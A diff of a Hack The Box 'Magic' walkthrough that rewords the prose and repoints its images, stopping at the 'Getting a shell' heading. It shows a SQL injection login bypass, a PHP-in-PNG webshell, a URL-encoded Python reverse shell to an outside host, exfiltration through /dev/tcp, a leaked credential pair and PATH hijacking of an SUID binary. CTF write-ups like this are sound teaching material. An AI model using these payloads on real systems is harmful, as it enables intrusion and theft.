@@ -6,14 +6,14 @@ points: 30
 rating: 4.7
 date: 2020-04-18
 avatar: assets/htb/magic.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Magic
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-`, a shorthand that scans every port, `-sC`, which is the same as `--script=default` and fires nmap's default enumeration scripts at the host, `-sV` for service detection, and `-oN <name>` to write the results to a file called `<name>`.
 
 ```text
 kac0@kali:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap <YOUR_IP>
@@ -36,9 +36,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 822.01 seconds
 ```
 
-Only two ports open - 22 SSH and 80 HTTP
+Just two open ports - 22 SSH and 80 HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-magic-site.png)
+![](assets/wu/magic/img-1.png)
 
 ### Nikto Scan
 
@@ -73,39 +73,37 @@ Starting nikto scan
 Finished nikto scan
 ```
 
-While testing various things, I found multiple ways forward for this next section.   First, I found the URL to an upload page at `/upload.php` with dirbuster, and I also noticed you can find the URL to the upload page in the home page's source.
+Poking around, I discovered several routes forward for the next stage.   To begin with, dirbuster turned up an upload page at `/upload.php`, and the same URL is also visible if you read the home page's source.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.5-image-upload.png)
+![](assets/wu/magic/img-2.png)
 
 ### HTTP Verb Tampering
 
-Once I had the URL, I was able to use Burp and use a bypass method called verb tampering. Nikto pointed this out by identifying that the DEBUG method was able to be used on this server.  
+With the URL in hand, I turned to Burp and applied a bypass technique known as verb tampering. Nikto had flagged this by noting that the DEBUG method was usable against the server.  
 
 ```text
 DEBUG HTTP verb may show server debugging information.
 ```
 
-According to a post on the SANS website [https://www.sans.org/blog/http-verb-tampering-in-asp-net/](https://www.sans.org/blog/http-verb-tampering-in-asp-net/), a vulnerability called HTTP Verb tampering can be used to enumerate the source of pages that are supposed to be behind access control methods.  This can be done by sending HTTP methods the server does not understand and is caused by a misconfiguration of the server.
+Per a SANS write-up [https://www.sans.org/blog/http-verb-tampering-in-asp-net/](https://www.sans.org/blog/http-verb-tampering-in-asp-net/), the HTTP Verb tampering flaw lets you read the source of pages that should be protected by access controls.  It works by sending HTTP methods the server doesn't recognize, and stems from a server misconfiguration.
 
-![DEBUG HTTP Method](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-debug-method.png)
+![DEBUG HTTP Method](assets/wu/magic/img-3.png)
 
-First I requested the `/upload.php` page normally, then captured the request in Burp and sent it to the Repeater tool.  The normal request tried to redirect me to the login page.  From here I changed the HTTP method to DEBUG to see what it would give me.
+I first hit `/upload.php` as usual, intercepted that request in Burp, and forwarded it to Repeater.  The standard request just bounced me to the login page.  From there I swapped the HTTP method to DEBUG to see what came back.
 
-![&quot;TEST&quot; HTTP Method](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3.5-test-method.png)
+![&quot;TEST&quot; HTTP Method](assets/wu/magic/img-4.png)
 
-Using the method DEBUG I was given the source of the `/upload.php` page!  This can also be done against this server by sending arbitrary method names as such `TEST`:
+With the DEBUG method the server handed me the source of `/upload.php`!  The same result works on this server using any made-up method name like `TEST`:
 
-![&quot;TEST&quot; HTTP Method](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3.5-test-method.png)
+![&quot;TEST&quot; HTTP Method](assets/wu/magic/img-4.png)
 
-{% hint style="info" %}
-There is a link to login at the bottom left of the home page which leads to the standard admin login page. While checking for for simple SQL injection I put my test command **`'or'a'='a`** in the password field and was logged right in! 
-{% endhint %}
+The home page has a login link in the bottom left that opens the usual admin login form. Testing for basic SQL injection, I dropped **`'or'a'='a`** into the password field and was authenticated immediately! 
 
-Whatever method used, it leads to the upload page where there is a simple drag & drop file uploader: 
+Either route ends up at the upload page, which has a basic drag & drop file uploader: 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-magic-upload.png)
+![](assets/wu/magic/img-5.png)
 
-After getting access to the upload page, I crafted an fake image upload with a PNG file header and PHP code in it and send it using Burp Repeater. I got this idea a while back from watching Ippsec's videos on [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s).
+Once on the upload page, I built a bogus image consisting of a PNG header plus embedded PHP and shipped it via Burp Repeater. I picked up this trick a while ago from Ippsec's video on [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s).
 
 [https://www.php.net/manual/en/function.passthru.php](https://www.php.net/manual/en/function.passthru.php) [https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru](https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru)
 
@@ -140,17 +138,15 @@ Upload Image
 -----------------------------25702794813234425341306225294--
 ```
 
-{% hint style="info" %}
-_This text may not work by directly copying and pasting. The PNG file header has some other bytes in it that do not render as ASCII and do not copy properly, but Burp is capable of grabbing them if you capture a file upload/download. I sent a test PNG first, then cut out everything but the headers to craft my payload._
-{% endhint %}
+_Copying and pasting this text directly probably won't work. The PNG header contains non-ASCII bytes that don't render or copy cleanly, but Burp can capture them if you intercept a file upload/download. I uploaded a test PNG first, then trimmed it down to just the headers to assemble my payload._
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5.5-image-upload_success.png)
+![](assets/wu/magic/img-6.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-image-upload.png)
+![](assets/wu/magic/img-7.png)
 
 `whoami` returns `www-data` 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-whoami.png)
+![](assets/wu/magic/img-8.png)
 
 `pwd` gets me `/var/www/Magic/images/uploads`
 
@@ -164,11 +160,11 @@ http://<YOUR_IP>/images/uploads/htb1.php.png?test=python3 -c 'import socket,subp
 http://<YOUR_IP>/images/uploads/htb1.php.png?test=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.57%22,8099));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
 ```
 
-sending a non-image file results in this message: `<script>alert('What are you trying to do there?')</script>`
+uploading a non-image file gives back this message: `<script>alert('What are you trying to do there?')</script>`
 
-to get burp to catch the request I had to go into the settings and disable the default filter that tells it not to intercept image requests
+to make burp intercept the request I had to open the settings and turn off the default filter that excludes image requests from interception
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-disable-image-filter.png)
+![](assets/wu/magic/img-9.png)
 
 ```python
 kac0@kali:~/Downloads$ nc -lvnp 8099
@@ -231,7 +227,7 @@ class Database
 }
 ```
 
-lets try those creds on SSH...nope
+let's try those creds on SSH...no luck
 
 ```text
 www-data@ubuntu:/$ uname -a
@@ -284,7 +280,7 @@ sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
 mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-only `theseus` and `root` can login what is this whoopsie process? [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484)
+only `theseus` and `root` have login shells what is this whoopsie process? [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11484)
 
 ## Road to User
 
@@ -297,7 +293,7 @@ tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
 ```
 
-There is a `mysql` service user, port 3306 is open...seems like MySQL is running! NExt I tried to find the executable files related to it to see how to get into the database.
+There's a `mysql` service account and port 3306 is listening...looks like MySQL is up! So next I hunted for the related executables to figure out how to reach the database.
 
 ```text
 www-data@ubuntu:/var/www/Magic/images/uploads$ find / -name mysql* -executable 2>/dev/null
@@ -361,11 +357,11 @@ www-data@ubuntu:/var/www/Magic/images/uploads$ find / -name mysql* -executable 2
 /var/lib/mysql-upgrade
 ```
 
-There were lots of programs installed related to mysql in `/usr/bin`. The one called `mysqldump` sounded particularly interesting. A quick search led me to the official documentation at [https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html](https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html)
+Plenty of mysql-related binaries were sitting in `/usr/bin`. The one named `mysqldump` caught my eye. A quick look brought me to the official docs at [https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html](https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html)
 
 > The mysqldump client utility performs logical backups, producing a set of SQL statements that can be executed to reproduce the original database object definitions and table data. It dumps one or more MySQL databases for backup or transfer to another SQL server. The mysqldump command can also generate output in CSV, other delimited text, or XML format.
 
-Sounds like a nice and easy way to quickly dump the database! The file `db.php5` in the web directory told me the database name was `Magic` and also gave me the username and password.
+Sounds like a quick, painless way to dump the database! The `db.php5` file in the web root revealed the database name was `Magic` along with the username and password.
 
 ```text
 www-data@ubuntu:/usr/bin$ mysqldump --databases Magic -u theseus -p            
@@ -433,7 +429,7 @@ UNLOCK TABLES;
 -- Dump completed on 2020-08-03 18:24:24
 ```
 
-The table named `login` had another set of credentials, this time for `admin:Th3s3usW4sK1ng`. These credentials did not work for the Magic database. It did however let me `su` to user `theseus`!
+The `login` table held a second credential pair, this one `admin:Th3s3usW4sK1ng`. Those creds didn't work against the Magic database, but they did let me `su` to the user `theseus`!
 
 ### User.txt
 
@@ -454,14 +450,14 @@ theseus@ubuntu:/dev/shm$ id
 uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
 ```
 
-user group is abnormal...what files can this user access?
+the users group is unusual...what can this account get at?
 
 ```text
 theseus@ubuntu:/dev/shm$ find / -group users 2>/dev/null
 /bin/sysinfo
 ```
 
-Only one file...supicious...and linpeas.sh shows /bin/sysinfo as suid pspy shows
+Just a single file...suspicious...and linpeas.sh reports /bin/sysinfo as suid pspy shows
 
 ```text
 2020/08/03 18:38:32 CMD: UID=122  PID=1138   | /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid                                                                                                 
@@ -510,7 +506,7 @@ Only one file...supicious...and linpeas.sh shows /bin/sysinfo as suid pspy shows
 2020/08/03 18:39:08 CMD: UID=0    PID=32623  | pidof apache2 php7.4 apache2 php7.3 apache2 php5.6
 ```
 
-I didn't know there was a sysinfo program for linux so I searched for privesc related to that. It turns out there was a vulnerability in such a program, back in 2018.
+I hadn't realized there was a sysinfo tool for linux, so I went looking for privesc tied to it. As it happens, there was a vulnerability in such a program back in 2018.
 
 ```text
 theseus@ubuntu:/dev/shm$ sysinfo
@@ -562,7 +558,7 @@ Mem:           3.8G        665M        892M         10M        2.3G        2.9G
 Swap:          947M          0B        947M
 ```
 
-however this program seemed to be running a few other commands. I recognized the output from the last part under "Mem Usage" as from the program `free`.
+it looked like this program shelled out to a handful of other commands. I recognized the bottom section under "Mem Usage" as output from `free`.
 
 ```text
 theseus@ubuntu:/dev/shm$ free
@@ -571,7 +567,7 @@ Mem:        4030648      680836      914544       10444     2435268     3049920
 Swap:        969960           0      969960
 ```
 
-Pretty much the same output!
+Basically identical output!
 
 ```text
 theseus@ubuntu:/dev/shm$ free -h
@@ -580,7 +576,7 @@ Mem:           3.8G        668M        888M         10M        2.3G        2.9G
 Swap:          947M          0B        947M
 ```
 
-while trying to get the help for the `free` program I stumbled upon the right flag to match the exact output from `sysinfo`. from the man page:
+while pulling up the help for `free` I happened on the exact flag that reproduces the `sysinfo` output. from the man page:
 
 ```text
 -h, --human
@@ -595,22 +591,22 @@ while trying to get the help for the `free` program I stumbled upon the right fl
                 Pi = pebibyte
 ```
 
-These units of measurement are based on 1024 rather than 1000. Storage is created using these measurements, so it is more accurate to the physical hardware. Marketing departments like to round this number to 1000 and use the standard kilo-, mega-, and giga-, etc. because it makes the storage size seem bigger, without actually lying! This is why your "500GB" hard drive only shows 465.661287 \(or so\) in the OS. Sneaky...
+These units use 1024 as the base instead of 1000. Storage is built around these values, so they map more accurately to the actual hardware. Marketing teams prefer to round to 1000 and use the familiar kilo-, mega-, giga-, etc. because it makes the capacity look larger without technically lying! That's why your "500GB" drive only reports around 465.661287 in the OS. Sneaky...
 
-hint: you can use the Bing in-search calculator to convert between the two measurements by typing `convert 500GB to gibibytes`.
+hint: you can convert between the two using the Bing in-search calculator by typing `convert 500GB to gibibytes`.
 
-I decided to exfiltrate the `sysinfo` program see how it worked. `theseus@ubuntu:/dev/shm$ cat /bin/sysinfo > /dev/tcp/10.10.15.57/8099`
+I figured I'd exfiltrate the `sysinfo` binary to inspect how it worked. `theseus@ubuntu:/dev/shm$ cat /bin/sysinfo > /dev/tcp/10.10.15.57/8099`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-free-ghidra.png)
+![](assets/wu/magic/img-10.png)
 
-By examining the program sysinfo in `ghidra` I could see that it called multiple other programs, similar to a bash script. The problem with this program was that it called these external programs only by name, and did not use the full absolute paths. This can allow a malicious attacker \(or even a friendly neighborhood security researcher!\) to create their own program in a folder that exists in the PATH earlier than the real one \(or one could simply prepend a folder of their choosing to the PATH environment variable!\)
+Loading sysinfo into `ghidra` showed that it invokes several other programs, much like a bash script would. The catch was that it called those external programs by name alone, without absolute paths. That opens the door for an attacker \(or a friendly neighborhood security researcher!\) to plant their own binary in a directory that sits ahead of the real one in PATH \(or to simply prepend a directory of their choosing to the PATH variable!\)
 
 `lshw, fdisk, free, cat /proc/cpuinfo`
 
-I decided to create my own `free` file, which hosted my reverse shell from earlier to see if I could get `sysinfo` to run it as `root`.  
-I had to add my working folder to the PATH, and then `theseus@ubuntu:/tmp$ export PATH=/dev/shm:$PATH`
+So I wrote my own `free` file containing the reverse shell from earlier, to test whether `sysinfo` would execute it as `root`.  
+I needed to put my working directory on the PATH first, then `theseus@ubuntu:/tmp$ export PATH=/dev/shm:$PATH`
 
-I also had to make sure to make the file was executable by root \(`+x` makes it executable for everyone unless you specify a UGO category\).  
+I also had to ensure the file was executable by root \(`+x` grants execute to everyone unless you name a specific UGO category\).  
 `theseus@ubuntu:/tmp$ chmod +x free`
 
 ### Getting a shell
